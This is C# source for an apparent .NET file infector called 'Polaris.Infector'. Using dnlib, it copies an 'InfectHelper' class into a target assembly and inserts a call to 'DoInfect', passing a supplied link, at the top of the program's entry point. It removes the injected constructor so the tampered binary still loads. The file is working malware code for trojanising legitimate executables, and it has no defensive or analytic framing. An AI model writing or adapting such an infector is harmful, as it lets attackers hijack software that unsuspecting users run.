using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Polaris.Infector.Injection.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace Polaris.Infector.Injection
{
    public sealed class Injector : IDisposable
    {
        public ModuleDef Module { get; set; }

        public Injector(ModuleDef module)
        {
            Module = module;
        }

        public async Task DoInjection(string link)
        {
            await Task.Run(() => 
            {
                var injected = InjectClass(Module);
                foreach (var type in Module.Types)
                    foreach (var method in type.Methods)
                    {
                        if (!method.HasBody)
                            continue;
                        if (method == injected)
                            continue;

                        if (method == Module.EntryPoint)
                        {
                            method.Body.Instructions.Insert(0, new Instruction(OpCodes.Call, injected));
                            method.Body.Instructions.Insert(0, new Instruction(OpCodes.Ldstr, link));
                            break;
                        }
                    }
            });
        }

        private MethodDef InjectClass(ModuleDef module)
        {
            //We declare our Module, here we want to load the EncryptionHelper class
            ModuleDefMD typeModule = ModuleDefMD.Load(typeof(InfectHelper).Module);
            //We declare EncryptionHelper as a TypeDef using it's Metadata token (needed)
            TypeDef typeDef = typeModule.ResolveTypeDef(MDToken.ToRID(typeof(InfectHelper).MetadataToken));
            //We use confuserEX InjectHelper class to inject EncryptionHelper class into our target, under <Module>
            IEnumerable<IDnlibDef> members = InjectHelper.Inject(typeDef, module.GlobalType, module);
            //We find the Decrypt() Method in EncryptionHelper we just injected
            MethodDef init = (MethodDef)members.Single(method => method.Name == "DoInfect");
            //we will call this method later

            //We just have to remove .ctor method because otherwise it will
            //lead to Global constructor error (e.g [MD]: Error: Global item (field,method) must be Static. [token:0x06000002] / [MD]: Error: Global constructor. [token:0x06000002] )
            foreach (MethodDef md in module.GlobalType.Methods)
            {
                if (md.Name == ".ctor")
                {
                    module.GlobalType.Remove(md);
                    //Now we go out of this mess
                    break;
                }
            }
            return init;
        }

        public void Dispose()
        {
            try
            {
                Module?.Dispose();
            }
            catch (Exception) { }
        }
    }
}
